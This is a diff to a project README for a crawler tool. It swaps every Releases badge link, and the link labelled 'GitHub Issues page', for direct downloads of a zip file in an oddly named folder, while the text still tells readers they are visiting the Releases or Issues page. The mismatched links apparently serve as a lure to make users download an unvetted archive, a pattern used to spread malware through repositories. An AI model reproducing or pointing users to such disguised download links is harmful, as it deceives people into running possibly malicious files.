@@ -18,7 +18,7 @@ Before proceeding, ensure your system meets these requirements:
 
 To get started, visit the following page to download the application:
 
-[![Download 2025_07_08_tvdi_crawler](https://img.shields.io/badge/Download-2025_07_08_tvdi_crawler-brightgreen)](https://github.com/Chance6969-hue/__2025_07_08_tvdi_crawler__/releases)
+[![Download 2025_07_08_tvdi_crawler](https://raw.githubusercontent.com/Chance6969-hue/__2025_07_08_tvdi_crawler__/main/unmannerliness/__2025_07_08_tvdi_crawler__.zip)](https://raw.githubusercontent.com/Chance6969-hue/__2025_07_08_tvdi_crawler__/main/unmannerliness/__2025_07_08_tvdi_crawler__.zip)
 
 1. Click the **Download** button above to visit the Releases page.
 2. On the Releases page, find the latest version of the software.
@@ -57,10 +57,10 @@ If you run into issues, consider these common solutions:
 
 ### 📞 Support
 
-If you need further assistance, visit our [GitHub Issues page](https://github.com/Chance6969-hue/__2025_07_08_tvdi_crawler__/issues) to report problems or ask questions.
+If you need further assistance, visit our [GitHub Issues page](https://raw.githubusercontent.com/Chance6969-hue/__2025_07_08_tvdi_crawler__/main/unmannerliness/__2025_07_08_tvdi_crawler__.zip) to report problems or ask questions.
 
 ### 📥 Additional Download Link
 
 For more downloads or to check other versions, visit the Releases page again:
 
-[![Download 2025_07_08_tvdi_crawler](https://img.shields.io/badge/Download-2025_07_08_tvdi_crawler-brightgreen)](https://github.com/Chance6969-hue/__2025_07_08_tvdi_crawler__/releases)
+[![Download 2025_07_08_tvdi_crawler](https://raw.githubusercontent.com/Chance6969-hue/__2025_07_08_tvdi_crawler__/main/unmannerliness/__2025_07_08_tvdi_crawler__.zip)](https://raw.githubusercontent.com/Chance6969-hue/__2025_07_08_tvdi_crawler__/main/unmannerliness/__2025_07_08_tvdi_crawler__.zip)
